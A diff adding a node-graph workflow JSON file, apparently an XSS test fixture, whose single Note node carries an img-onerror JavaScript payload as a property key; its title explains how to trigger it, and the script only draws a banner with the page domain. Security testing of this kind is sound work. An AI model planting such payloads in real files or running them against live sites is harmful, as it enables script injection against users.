@@ -1,0 +1,27 @@
+{
+  "last_node_id": 1,
+  "last_link_id": 0,
+  "nodes": [
+    {
+      "id": 1,
+      "type": "Note",
+      "pos": [400, 300],
+      "size": [340, 130],
+      "flags": {},
+      "order": 0,
+      "mode": 0,
+      "inputs": [],
+      "outputs": [],
+      "title": "Right-click -> Properties -> click the entry",
+      "properties": {
+        "<img src=x onerror=\"var b=document.createElement('div');b.textContent='XSS E2 property-key \\u2014 '+document.domain;b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c0392b;color:#fff;font:bold 16px/1.4 sans-serif;padding:14px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.4)';document.body.appendChild(b)\">": "anything"
+      },
+      "widgets_values": ["hi"]
+    }
+  ],
+  "links": [],
+  "groups": [],
+  "config": {},
+  "extra": {},
+  "version": 0.4
+}
